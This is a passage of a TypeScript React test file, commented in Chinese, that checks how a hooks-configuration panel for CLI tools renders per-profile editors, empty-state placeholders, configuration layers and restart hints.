    // 直渲染 stubcli 页 → 编辑器槽 = stub 桩组件（profile 声明的 configEditor），而非 claude 编辑器
    await waitFor(
      () => expect(container.querySelector('[data-e2e="stub-config-editor"]')).toBeTruthy(),
    );
    // 桩组件不经 claude 编辑器内部：JsonMode 零调用 + 不读配置（桩无 IPC）
    expect(mockJsonMode).not.toHaveBeenCalled();
    expect(mockReadHooksConfig).not.toHaveBeenCalled();
    // 桩渲染携带 profile 数据（props 透传）
    expect(container.textContent).toContain("stub 编辑器：stubcli");
  });

  it("hasConfigEditor=true 但 configEditor 缺失 → 编辑器槽空态占位（KZ-1 防御，不渲染 claude 编辑器）", async () => {
    registerOnly([claudeProfile, GAP_PROFILE]);
    const { container, queryByRole } = renderPanel(GAP_PROFILE.id);
    // 空态占位标记出现（data-e2e hooks-editor-empty），不渲染任何编辑器
    await waitFor(
      () => expect(container.querySelector('[data-e2e="hooks-editor-empty"]')).toBeTruthy(),
    );
    expect(container.textContent).toContain("该 CLI 未提供配置编辑器");
    // 防御成立：claude 编辑器内部未被调用（JsonMode 零挂载、不读配置、无保存按钮）
    expect(mockJsonMode).not.toHaveBeenCalled();
    expect(mockReadHooksConfig).not.toHaveBeenCalled();
    expect(queryByRole("button", { name: "保存" })).toBeNull();
  });

  it("层级切换器数据源 = profile.configLayers（KZ-4：自定义层渲染，非固定三层）", async () => {
    registerOnly([claudeProfile, LAYERS_PROFILE]);
    seedProject("C:/proj"); // 初始层 project 非 user——无 rootPath 会被 useHooksConfig 回退 user 层
    mockReadHooksConfig.mockResolvedValue({});
    // 挂载 layerscli 页（configLayers = project/local 两层）→ 层按钮 = profile 声明层
    const { getByRole, queryByRole } = renderPanel(LAYERS_PROFILE.id);
    await waitFor(() => expect(getByRole("button", { name: "Project" })).toBeTruthy());
    expect(getByRole("button", { name: "Local" })).toBeTruthy();
    // claude 固定三层不渲染（数据源非常量 LAYERS，而是 profile 声明；User 不在本 profile 声明内）
    expect(queryByRole("button", { name: "User" })).toBeNull();
    // 初始层 = configLayers[0].id（project）——首次 read 携初始层
    await waitFor(() => expect(mockReadHooksConfig.mock.calls.length).toBe(1));
    expect(mockReadHooksConfig.mock.calls[0][1]).toBe("project");
  });

  it("restartHint 由 profile 驱动（文案来源 = profile.hooks.restartHint，MC-222/506）", async () => {
    registerOnly([claudeProfile, TEST_PROFILE]);
    mockReadHooksConfig.mockResolvedValue({});
    // 挂载 testcli 页（restartHint = "testcli 专属提示"，区别于 claude 文案）
    const { container } = renderPanel(TEST_PROFILE.id);
    await waitFor(() => expect(mockReadHooksConfig.mock.calls.length).toBe(1));
    // 合法编辑 → 保存成功 → 提示条文案 = testcli profile 的 restartHint
    act(() => {
      const props = mockJsonMode.mock.calls[
        mockJsonMode.mock.calls.length - 1
      ] as unknown as [
        {
          onChange: (t: string) => void;
          onValidationChange: (v: boolean, d: unknown[]) => void;
        },
      ];
      props[0].onChange(
        JSON.stringify({ PreToolUse: [{ hooks: [{ type: "command", command: "x" }] }] }),
      );
      props[0].onValidationChange(true, []);
    });
    fireEvent.click(container.querySelector('[data-e2e="hooks-save"]') as HTMLButtonElement);
    await waitFor(() =>
      expect(container.querySelector('[data-e2e="hooks-restart-hint"]')).toBeTruthy(),
    );
    const hint = container.querySelector('[data-e2e="hooks-restart-hint"]') as HTMLElement;
    expect(hint.textContent).toContain(TEST_PROFILE.capabilities.hooks?.restartHint ?? "");
    expect(hint.textContent).not.toContain("claude");
    // 保存携页 cliId
    expect(mockWriteHooksConfig).toHaveBeenCalledTimes(1);
    expect(mockWriteHooksConfig.mock.calls[0][0]).toBe(TEST_PROFILE.id);
  });
});
